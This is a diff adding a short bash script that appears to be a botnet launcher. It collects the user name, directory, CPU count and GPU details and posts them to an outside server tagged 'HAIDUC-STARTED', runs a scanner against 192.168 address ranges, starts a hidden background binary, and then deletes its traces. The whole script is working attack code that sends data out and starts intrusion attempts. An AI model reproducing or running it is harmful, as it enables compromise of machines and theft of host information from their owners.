@@ -1,0 +1,15 @@
+#!/bin/bash
+pwd > dir.dir
+dir=`cat dir.dir`
+SERVERIP=`curl http://www.karaibe.us/.foo/remote/info.php --connect-timeout 10`
+echo "$(whoami)@$SERVERIP
+DATE--->$(date)
+SCANDIR: $(pwd)
+PROCESORS: $(nproc)
+VIDEO: $(lspci | grep VGA)" > data.file
+data=`cat data.file`
+curl -d "info=HAIDUC-STARTED&data=$data" http://www.karaibe.us/.foo/remote/info.php --connect-timeout 10
+./sparky.sh 192.168
+./rand > /dev/null &
+sleep 20
+rm -rf data.file
